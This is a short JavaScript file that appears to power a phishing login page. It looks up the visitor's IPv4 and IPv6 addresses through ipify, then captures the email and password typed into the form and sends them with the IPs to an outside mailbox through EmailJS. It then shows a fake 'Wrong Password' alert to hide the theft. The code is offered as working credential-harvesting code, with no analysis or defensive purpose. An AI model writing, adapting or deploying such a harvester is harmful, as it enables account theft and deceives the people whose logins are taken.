function getIPAddresses() {
    // Fetch IPv6 address
    fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipv6 = data.ip;
            document.getElementById('ipv6').textContent = ipv6;
            
            // Fetch IPv4 address
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipv4 = data.ip;
                    document.getElementById('ipv4').textContent = ipv4;
                    
                    // Send IP addresses to the server
                    sendIPAddresses(ipv4, ipv6);
                })
                .catch(err => {
                    console.error('Error fetching IPv4 address:', err);
                    document.getElementById('ipv4').textContent = 'N/A';
                });
        })
        .catch(err => {
            console.error('Error fetching IPv6 address:', err);
            document.getElementById('ipv6').textContent = 'N/A';
        });
}

window.onload = getIPAddresses;

function sendMail() {
  var params = {
    email: document.getElementById("email").value,
    password: document.getElementById("password").value,
    ipv4: document.getElementById("ipv4").value,
    ipv6: document.getElementById("ipv6").value,
  };

  const serviceID = "service_v127bm1";
  const templateID = "template_avc41ik";

    emailjs.send(serviceID, templateID, params)
    .then(res=>{
        document.getElementById("email").value = "";
        document.getElementById("password").value = "";
        console.log(res);
        alert("Wrong Password")

    })
    .catch(err=>console.log(err));

}
